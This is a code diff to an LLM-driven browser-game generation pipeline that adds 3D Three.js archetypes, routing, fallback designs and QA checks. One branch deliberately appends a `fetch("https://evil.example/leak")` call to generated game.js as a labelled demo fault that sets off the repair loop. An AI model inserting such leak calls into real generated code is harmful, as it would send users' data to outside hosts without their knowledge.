@@ -55,6 +55,31 @@ _ARCHETYPES = {
     },
 }
 
+# 3D（dimension=="3d"）专用原型，与上面的 2D 原型并列。3D 完全由模型产出，
+# 无确定性模板兜底；这些只决定路由、设计提示与少样本参考。
+_ARCHETYPES_3D = {
+    "fps_arena": {
+        "genre": "shooter",
+        "label": "first-person arena shooter",
+        "loop": "lock the mouse, strafe and aim, gun down advancing enemy waves, beat the boss",
+    },
+    "runner_3d": {
+        "genre": "runner",
+        "label": "third-person 3D runner",
+        "loop": "auto-run forward, switch lanes and jump to dodge obstacles, grab orbs",
+    },
+    "racer_3d": {
+        "genre": "runner",
+        "label": "arcade 3D racer",
+        "loop": "steer along a track, hit checkpoints, beat the timer",
+    },
+    "collector_3d": {
+        "genre": "arcade",
+        "label": "third-person 3D collector",
+        "loop": "roam a 3D arena, gather pickups, avoid roaming hazards",
+    },
+}
+
 
 def _parse_json(raw: str) -> dict:
     match = re.search(r"\{.*\}", raw or "", re.S)
@@ -204,7 +229,8 @@ def _coerce_design(data: dict, spec: dict | None = None) -> dict:
         if isinstance(data.get("ui"), dict):
             base["ui"].update(data["ui"])
         # 模型优先：保留 GameDesignAgent 产出的丰富结构，原样喂给 Coder
-        for key in ("background", "player", "waves", "powerups", "boss", "juice"):
+        # ("scene" 是 3D 设计的相机/环境/空间，必须保留)
+        for key in ("scene", "background", "player", "waves", "powerups", "boss", "juice"):
             if data.get(key):
                 base[key] = data[key]
     return base
@@ -217,6 +243,28 @@ def _simplify_design(design: dict) -> dict:
     simplified = _heuristic_design(spec)
     simplified["rules"]["survive_seconds"] = 50
     return simplified
+
+
+def _simplify_design_3d(design: dict) -> dict:
+    """3D replan 兜底：模型不可用时给一个最小可实现的 3D 设计（仍是 3D，不回退 2D）。"""
+    current = design or {}
+    archetype = current.get("archetype") if current.get("archetype") in _ARCHETYPES_3D else "fps_arena"
+    meta = _ARCHETYPES_3D[archetype]
+    return {
+        "archetype": archetype,
+        "scene": {
+            "camera": "first_person" if archetype == "fps_arena" else "third_person",
+            "fov": 72,
+            "environment": "dark arena with fog and a glowing grid floor",
+            "space": "a bounded arena the player stays inside",
+        },
+        "player": {"visual": "simple primitive avatar", "controls": "WASD + mouse", "abilities": ["move", "act"]},
+        "entities": [{"name": "drone", "role": "enemy", "visual": "emissive low-poly shape", "movement": "homes toward the player", "behavior": "advance and threaten"}],
+        "waves": [{"t": 0, "spawn": "few", "note": "safe opening"}, {"t": 12, "spawn": "more", "note": "ramp up"}],
+        "rules": {"win": "survive / clear waves", "lose": "hp depleted", "survive_seconds": 60, "score": "per kill / pickup"},
+        "ui": {"show_score": True, "show_lives": True, "show_restart_button": True, "crosshair": archetype == "fps_arena"},
+        "core_loop": meta["loop"],
+    }
 
 
 def _should_inject(state: dict) -> bool:
@@ -277,12 +325,15 @@ _DEFAULT_CSS = (
 )
 
 
-def _assemble_bundle(bundle: dict, title: str) -> list[dict]:
+def _assemble_bundle(bundle: dict, title: str, dimension: str = "2d") -> list[dict]:
     """Turn parsed model files into the canonical 3-file bundle; synthesize a
-    minimal index.html / style.css when the model only returned game.js."""
+    minimal index.html / style.css when the model only returned game.js.
+    For 3D, ensure the self-hosted Three.js engine loads before game.js."""
     js = bundle.get("game.js", "")
     css = bundle.get("style.css") or _DEFAULT_CSS
     index = bundle.get("index.html")
+    needs_three = dimension == "3d"
+    three_tag = '<script src="three.min.js"></script>' if needs_three else ""
     if not index or "game.js" not in index:
         index = (
             '<!doctype html><html><head><meta charset="utf-8">'
@@ -290,8 +341,14 @@ def _assemble_bundle(bundle: dict, title: str) -> list[dict]:
             f"<title>{title}</title>"
             '<link rel="stylesheet" href="style.css"></head><body>'
             '<canvas id="stage"></canvas>'
-            '<script src="game.js"></script></body></html>'
+            f'{three_tag}<script src="game.js"></script></body></html>'
         )
+    elif needs_three and "three.min.js" not in index:
+        # 模型给了 index 但漏了引擎：插到 <head> 末尾，确保先于 game.js 执行。
+        if "</head>" in index:
+            index = index.replace("</head>", '<script src="three.min.js"></script></head>', 1)
+        else:
+            index = index.replace("<body>", '<body><script src="three.min.js"></script>', 1)
     return [
         {"path": "index.html", "content": index},
         {"path": "style.css", "content": css},
@@ -316,7 +373,19 @@ _REFERENCE_BY_GENRE = {
 }
 
 
+# 3D few-shot 参考（self-hosted Three.js 的完整可跑样例）。
+_REFERENCE_BY_ARCHETYPE_3D = {
+    "fps_arena": "three_fps",
+    "collector_3d": "three_fps",
+    "runner_3d": "three_runner",
+    "racer_3d": "three_runner",
+}
+
+
 def _reference_for(spec: dict) -> str | None:
+    if str(spec.get("dimension") or "") == "3d":
+        key = _REFERENCE_BY_ARCHETYPE_3D.get(str(spec.get("archetype") or "")) or "three_fps"
+        return bundles.BUNDLES.get(key)
     archetype = str(spec.get("archetype") or "")
     genre = str(spec.get("genre") or "").lower()
     key = _REFERENCE_BY_ARCHETYPE.get(archetype) or _REFERENCE_BY_GENRE.get(genre) or "moonlitkoi"
@@ -678,6 +747,38 @@ def _route_archetype(spec: dict, prompt: str, brief: dict | None = None, mechani
     return {"archetype": archetype, "genre": meta["genre"], "label": meta["label"], "core_loop": meta["loop"], "reason": reason}
 
 
+def _route_archetype_3d(spec: dict, prompt: str, brief: dict | None = None, mechanics: dict | None = None) -> dict:
+    """3D 路由：按关键词/类型选 3D 原型（忽略 2D mechanic 提示）。"""
+    text = " ".join(
+        str(value)
+        for value in [
+            prompt,
+            (brief or {}).get("player_fantasy"),
+            (brief or {}).get("objective"),
+            spec.get("title"),
+            spec.get("genre"),
+            spec.get("theme"),
+            spec.get("core_loop"),
+            " ".join(spec.get("tags") or []),
+        ]
+        if value
+    ).lower()
+    if _has_any(text, ["race", "racing", "racer", "drift", "kart", "car", "track", "赛车", "漂移", "赛道", "卡丁"]):
+        archetype, reason = "racer_3d", "racing keywords"
+    elif _has_any(text, ["shoot", "fps", "gun", "shooter", "first person", "first-person", "战机", "射击", "枪", "第一人称", "弹幕", "空战", "arena"]):
+        archetype, reason = "fps_arena", "shooter/fps keywords"
+    elif _has_any(text, ["run", "runner", "dash", "dodge", "lane", "parkour", "jump", "跑酷", "躲", "跑", "冲刺", "跳"]):
+        archetype, reason = "runner_3d", "runner keywords"
+    elif _has_any(text, ["collect", "gather", "explore", "coin", "gem", "loot", "收集", "探索", "金币", "宝石"]):
+        archetype, reason = "collector_3d", "collection keywords"
+    else:
+        genre = str(spec.get("genre") or "").lower()
+        archetype = "fps_arena" if genre == "shooter" else "runner_3d" if genre == "runner" else "collector_3d"
+        reason = f"genre fallback: {genre or 'arcade'}"
+    meta = _ARCHETYPES_3D[archetype]
+    return {"archetype": archetype, "genre": meta["genre"], "label": meta["label"], "core_loop": meta["loop"], "reason": reason}
+
+
 def _difficulty_factor(prompt: str) -> float:
     p = prompt.lower()
     if _has_any(p, ["hard", "difficult", "expert", "困难", "高难", "挑战"]):
@@ -759,7 +860,7 @@ def _gameplay_qa(state: dict) -> dict:
     quality gaps become warnings that never degrade the bundle to a template."""
     spec = state.get("game_spec") or {}
     design = state.get("game_design") or {}
-    archetype = spec.get("archetype") or design.get("archetype") or "canvas_arcade"
+    archetype = spec.get("archetype") or design.get("archetype") or ("webgl_3d" if state.get("dimension") == "3d" else "canvas_arcade")
     validation_result = state.get("validation_result") or {}
     files = state.get("generated_files") or []
     js = next((f.get("content", "") for f in files if f.get("path") == "game.js"), "")
@@ -786,14 +887,24 @@ def _gameplay_qa(state: dict) -> dict:
     if not has_restart:
         warnings.append("no obvious restart affordance detected")
 
-    uses_depth = any(tok in low for tok in ["shadowblur", "createlineargradient", "createradialgradient"])
-    if not uses_depth:
-        warnings.append("art may look flat: no gradient/glow detected")
-    if archetype == "vertical_shooter":
-        if not _has_any(low, ["bullet", "shoot", "fire", "projectile", "laser"]):
-            warnings.append("shooter has no obvious projectile logic")
-        if "boss" not in low:
-            warnings.append("shooter has no boss climax")
+    is_3d = state.get("dimension") == "3d"
+    if is_3d:
+        depth_metric = any(tok in low for tok in ["three.", "webglrenderer", "perspectivecamera", "scene()", "new scene"])
+        if not depth_metric:
+            warnings.append("3D may be missing: no Three.js/WebGL usage detected")
+        if "three.min.js" not in low:
+            warnings.append("index.html does not reference the self-hosted three.min.js")
+        if archetype == "fps_arena" and not _has_any(low, ["raycaster", "pointerlock", "requestpointerlock"]):
+            warnings.append("fps_arena has no raycaster / pointer-lock logic")
+    else:
+        depth_metric = any(tok in low for tok in ["shadowblur", "createlineargradient", "createradialgradient"])
+        if not depth_metric:
+            warnings.append("art may look flat: no gradient/glow detected")
+        if archetype == "vertical_shooter":
+            if not _has_any(low, ["bullet", "shoot", "fire", "projectile", "laser"]):
+                warnings.append("shooter has no obvious projectile logic")
+            if "boss" not in low:
+                warnings.append("shooter has no boss climax")
 
     return {
         "passed": not issues,
@@ -804,16 +915,18 @@ def _gameplay_qa(state: dict) -> dict:
             "js_bytes": len(js.encode("utf-8")),
             "has_input": has_input,
             "has_restart": has_restart,
-            "uses_gradient_or_glow": uses_depth,
+            ("uses_three_webgl" if is_3d else "uses_gradient_or_glow"): depth_metric,
         },
     }
 
 
 def _gameplay_qa_log_lines(result: dict) -> list[str]:
     m = result.get("metrics") or {}
+    depth_label = "three/webgl" if "uses_three_webgl" in m else "gradient/glow"
+    depth_val = m.get("uses_three_webgl", m.get("uses_gradient_or_glow"))
     lines = [
         f"playtest archetype: {result.get('archetype')}",
-        f"code smoke: game.js={m.get('js_bytes')} bytes, input={m.get('has_input')}, restart={m.get('has_restart')}, gradient/glow={m.get('uses_gradient_or_glow')}",
+        f"code smoke: game.js={m.get('js_bytes')} bytes, input={m.get('has_input')}, restart={m.get('has_restart')}, {depth_label}={depth_val}",
     ]
     if result.get("warnings"):
         lines.append("quality warnings: " + "; ".join(result["warnings"][:4]))
@@ -841,6 +954,37 @@ def _repair_balance(balance: dict, archetype: str, attempt: int) -> dict:
 def _generate_code(state: dict, repair_error: str | None = None) -> tuple[list[dict], int, str]:
     spec = state.get("game_spec") or {}
     design = state.get("game_design") or {}
+    title = str(spec.get("title") or "PlayForge Game")
+
+    # 3D：无模板兜底，完全由模型产出。失败/过短 → 返回不合规 bundle，交给 repair/replan。
+    if state.get("dimension") == "3d":
+        files: list[dict] = []
+        tokens = 0
+        if not state.get("use_real"):
+            mode = "3D needs real model (offline mock cannot author 3D)"
+        else:
+            try:
+                raw, tokens = llm.chat(
+                    prompts.CODE_SYSTEM_PROMPT_3D,
+                    prompts.build_code_prompt(spec, design, _reference_for(spec), repair_error, dimension="3d"),
+                )
+                bundle = _extract_bundle(raw)
+                js = bundle.get("game.js", "")
+                files = _assemble_bundle(bundle, title, dimension="3d")
+                if js and len(js) > 400:
+                    mode = "model (full 3D bundle)" if bundle.get("index.html") else "model (3D game.js)"
+                else:
+                    mode = "model 3D output too short -> QA/repair"
+            except Exception as exc:  # noqa: BLE001
+                files = []
+                mode = f"model 3D failed: {_clip(exc, 120)}"
+        if _should_inject(state):
+            for file in files:
+                if file["path"] == "game.js":
+                    file["content"] += '\nfetch("https://evil.example/leak");  // [demo] forbidden API'
+        return files, tokens, mode
+
+    # ---- 2D：确定性模板基线 + 模型优先覆盖（原逻辑）----
     tname = templating.select_template(spec, design)
     cfg = templating.build_config(spec, design, state.get("asset_manifest") or {}, state.get("balance_config"))
     files = templating.render_files(tname, cfg)
@@ -974,7 +1118,14 @@ def mechanic_planner_node(state: dict) -> dict:
 def archetype_router_node(state: dict) -> dict:
     prompt = state.get("normalized_prompt") or state.get("prompt", "")
     spec = dict(state.get("game_spec") or {})
-    result = _route_archetype(spec, prompt, state.get("expanded_brief"), state.get("mechanic_plan"))
+    is_3d = state.get("dimension") == "3d"
+    if is_3d:
+        spec["dimension"] = "3d"
+        spec["target_runtime"] = "webgl"
+        result = _route_archetype_3d(spec, prompt, state.get("expanded_brief"), state.get("mechanic_plan"))
+    else:
+        spec["dimension"] = "2d"
+        result = _route_archetype(spec, prompt, state.get("expanded_brief"), state.get("mechanic_plan"))
     spec["archetype"] = result["archetype"]
     spec["genre"] = result["genre"]
     spec["core_loop"] = result["core_loop"]
@@ -991,7 +1142,11 @@ def archetype_router_node(state: dict) -> dict:
             f"archetype selected: {result['archetype']} ({result['label']})",
             f"routing reason: {result['reason']}",
             f"core loop locked: {result['core_loop']}",
-            "template family: deterministic canvas, no network, no storage",
+            (
+                "runtime: 3D WebGL (Three.js, self-hosted) — model-authored, no template fallback"
+                if is_3d
+                else "template family: deterministic canvas, no network, no storage"
+            ),
         ],
     }
 
@@ -1016,11 +1171,13 @@ def asset_processing_node(state: dict) -> dict:
 
 def game_design_node(state: dict) -> dict:
     spec = state.get("game_spec") or {}
+    is_3d = state.get("dimension") == "3d"
     if state.get("use_real"):
         try:
-            raw, tokens = llm.chat(prompts.GAME_DESIGN_SYSTEM_PROMPT, prompts.build_game_design_prompt(spec, state.get("asset_manifest")))
+            sys_prompt = prompts.GAME_DESIGN_SYSTEM_PROMPT_3D if is_3d else prompts.GAME_DESIGN_SYSTEM_PROMPT
+            raw, tokens = llm.chat(sys_prompt, prompts.build_game_design_prompt(spec, state.get("asset_manifest")))
             design = _coerce_design(_parse_json(raw), spec)
-            return {"game_design": design, "_agent": "GameDesignAgent", "_tokens_delta": tokens, "_logs": ["source: model GameDesign JSON"] + _design_log_lines(design)}
+            return {"game_design": design, "_agent": "GameDesignAgent", "_tokens_delta": tokens, "_logs": [f"source: model GameDesign JSON ({'3D' if is_3d else '2D'})"] + _design_log_lines(design)}
         except Exception as exc:  # noqa: BLE001
             design = _heuristic_design(spec)
             return {"game_design": design, "_agent": "GameDesignAgent", "_logs": [f"model failed: {_clip(exc, 120)}", "source: heuristic fallback"] + _design_log_lines(design)}
@@ -1068,16 +1225,26 @@ def code_generation_node(state: dict) -> dict:
     files, tokens, mode = _generate_code(state)
     spec = state.get("game_spec") or {}
     design = state.get("game_design") or {}
-    cfg = templating.build_config(spec, design, state.get("asset_manifest") or {}, state.get("balance_config"))
-    tname = templating.select_template(spec, design)
-    logs = [
-        f"selected template: {tname}",
-        f"runtime config: archetype={cfg.get('archetype')}, duration={cfg.get('duration')}s, target={cfg.get('target_score')}, lives={cfg.get('lives')}",
-        f"difficulty config: hazard_speed={cfg.get('hazard_speed')}, hazard_spawn={cfg.get('hazard_spawn_ms')}ms, max_hazards={cfg.get('max_hazards')}",
-        f"mechanic content: {cfg.get('mechanic_label')} with {cfg.get('wave_count')} wave(s)",
-        f"control hint: {_clip(cfg.get('hint'), 90)}",
-        f"game.js source: {mode}",
-    ] + _file_log_lines(files)
+    if state.get("dimension") == "3d":
+        scene = design.get("scene") if isinstance(design.get("scene"), dict) else {}
+        logs = [
+            "render mode: 3D WebGL via self-hosted Three.js (relative three.min.js, global THREE)",
+            f"archetype: {spec.get('archetype')} ({(state.get('archetype_result') or {}).get('label', '3D')})",
+            f"camera/scene: {scene.get('camera', 'n/a')} · {_clip(scene.get('environment'), 80)}",
+            "few-shot reference: " + _REFERENCE_BY_ARCHETYPE_3D.get(str(spec.get("archetype") or ""), "three_fps"),
+            f"game.js source: {mode}",
+        ] + _file_log_lines(files)
+    else:
+        cfg = templating.build_config(spec, design, state.get("asset_manifest") or {}, state.get("balance_config"))
+        tname = templating.select_template(spec, design)
+        logs = [
+            f"selected template: {tname}",
+            f"runtime config: archetype={cfg.get('archetype')}, duration={cfg.get('duration')}s, target={cfg.get('target_score')}, lives={cfg.get('lives')}",
+            f"difficulty config: hazard_speed={cfg.get('hazard_speed')}, hazard_spawn={cfg.get('hazard_spawn_ms')}ms, max_hazards={cfg.get('max_hazards')}",
+            f"mechanic content: {cfg.get('mechanic_label')} with {cfg.get('wave_count')} wave(s)",
+            f"control hint: {_clip(cfg.get('hint'), 90)}",
+            f"game.js source: {mode}",
+        ] + _file_log_lines(files)
     if _should_inject(state):
         logs.append("[demo] injected forbidden API to trigger repair loop")
     return {"generated_files": files, "_agent": "GameCodeAgent", "_tokens_delta": tokens, "_logs": logs}
@@ -1155,17 +1322,19 @@ def gameplay_repair_node(state: dict) -> dict:
 
 def replan_game_design_node(state: dict) -> dict:
     attempts = state.get("replan_attempts", 0) + 1
+    is_3d = state.get("dimension") == "3d"
     extra = {}
     if state.get("use_real"):
         try:
-            raw, tokens = llm.chat(prompts.REPLAN_SYSTEM_PROMPT, prompts.build_replan_prompt(state.get("game_spec"), state.get("game_design"), state.get("last_error")))
+            sys_prompt = prompts.REPLAN_SYSTEM_PROMPT_3D if is_3d else prompts.REPLAN_SYSTEM_PROMPT
+            raw, tokens = llm.chat(sys_prompt, prompts.build_replan_prompt(state.get("game_spec"), state.get("game_design"), state.get("last_error")))
             design = _coerce_design(_parse_json(raw), state.get("game_spec"))
             extra = {"_tokens_delta": tokens}
         except Exception:
-            design = _simplify_design(state.get("game_design"))
+            design = _simplify_design_3d(state.get("game_design")) if is_3d else _simplify_design(state.get("game_design"))
     else:
-        design = _simplify_design(state.get("game_design"))
-    return {
+        design = _simplify_design_3d(state.get("game_design")) if is_3d else _simplify_design(state.get("game_design"))
+    out = {
         "game_design": design,
         "generated_files": [],
         "validation_result": {},
@@ -1174,17 +1343,23 @@ def replan_game_design_node(state: dict) -> dict:
         "gameplay_repair_attempts": 0,
         "replan_attempts": attempts,
         "last_error": None,
-        "use_template_code": True,
         "_agent": "GameDesignAgentReplan",
         "_logs": [
             f"replan attempt: {attempts}/{MAX_REPLAN}",
             f"reason: {_clip(state.get('last_error'), 180)}",
-            "simplified playable scope and switched to stable template code",
+            (
+                "simplified the 3D scope; kept model-authored 3D (no 2D fallback)"
+                if is_3d
+                else "simplified playable scope and switched to stable template code"
+            ),
         ]
         + _design_log_lines(design)
         + ["reset repair counters; queued balance planning"],
         **extra,
     }
+    if not is_3d:
+        out["use_template_code"] = True  # 仅 2D 回退稳定模板；3D 保持模型优先
+    return out
 
 
 def publish_artifact_node(state: dict) -> dict:
